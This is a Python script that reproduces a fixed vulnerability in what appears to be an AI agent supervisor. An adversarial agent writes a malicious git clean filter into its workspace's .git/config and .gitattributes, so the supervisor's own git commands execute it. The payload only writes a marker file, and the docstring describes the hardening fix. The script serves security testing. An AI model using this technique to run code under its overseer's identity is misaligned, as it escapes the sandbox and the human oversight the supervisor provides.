#!/usr/bin/env python3
"""
Reproduction Script: A2 Supervisor Git Clean Filter and Hook Bypass.

Pre-Fix Commit: a30df97ffb0ef697486e92ef43cbfd37e23974bb (P0-3 pre-fix)
Post-Fix Commit: d6b072d (P0-3 hardened git isolation)

Vulnerability Description:
In commit a30df97, supervisor git invocations (such as git hash-object, update-index,
and commit-tree) executed within the agent's workspace directory (cwd=self.workspace).
Because git automatically reads `.git/config` and `.gitattributes` from the working tree
by default, an adversarial agent in the workspace could define a malicious clean filter:
    [filter "evil"]
        clean = "cmd.exe /c echo PWNED > filter_ran.txt"
When the supervisor created turn snapshots or computed derived commit trees, git executed
the workspace clean filter under the supervisor's process identity.

Reproduction Command:
    uv run python scripts/reproduce_a2_filter_bypass.py

Expected Pre-Fix Outcome:
    Marker file 'filter_ran.txt' is created containing executed shell output.
Expected Post-Fix Outcome:
    Supervisor uses external store repo, -c core.hooksPath=, -c core.fsmonitor=false,
    and external index file; marker file is NOT created.
"""

from __future__ import annotations

import os
import subprocess
import sys
import tempfile
from pathlib import Path


def main() -> int:
    temp_dir = Path(tempfile.mkdtemp(prefix="a2_bypass_repro_"))
    ws = temp_dir / "workspace"
    store = temp_dir / "supervisor_store.git"
    ws.mkdir()
    store.mkdir()

    # Initialize workspace git repo
    subprocess.run(["git", "init", "-b", "master"], cwd=ws, check=True, capture_output=True)
    subprocess.run(["git", "init", "--bare"], cwd=store, check=True, capture_output=True)

    marker_file = temp_dir / "filter_ran.txt"
    if marker_file.exists():
        marker_file.unlink()

    # 1. Adversary configures workspace .git/config with malicious clean filter
    git_config = ws / ".git" / "config"
    with open(git_config, "a", encoding="utf-8") as f:
        f.write(
            f'\n[filter "evil"]\n\tclean = "cmd.exe /c echo evil > {marker_file.as_posix()}"\n'
        )

    # 2. Adversary assigns filter in workspace .gitattributes
    (ws / ".gitattributes").write_text("* filter=evil\n", encoding="utf-8")
    (ws / "payload.txt").write_text("agent content\n", encoding="utf-8")

    print("[*] Configured workspace with filter.evil.clean in .git/config and .gitattributes")

    # 3. Simulate pre-fix supervisor invocation (cwd=ws running git add / commit without isolation)
    print("[*] Simulating pre-fix supervisor commit invocation directly in workspace...")
    subprocess.run(
        ["git", "add", "payload.txt"],
        cwd=ws,
        capture_output=True,
        text=True,
    )

    if marker_file.is_file():
        content = marker_file.read_text(encoding="utf-8").strip()
        print(f"[!] VULNERABILITY REPRODUCED: filter_ran.txt was created with content: '{content}'")
        print("[!] Pre-fix supervisor executed arbitrary code via workspace filter.")
        return 0
    else:
        print("[+] Filter was neutralized; marker file not created.")
        return 1


if __name__ == "__main__":
    sys.exit(main())
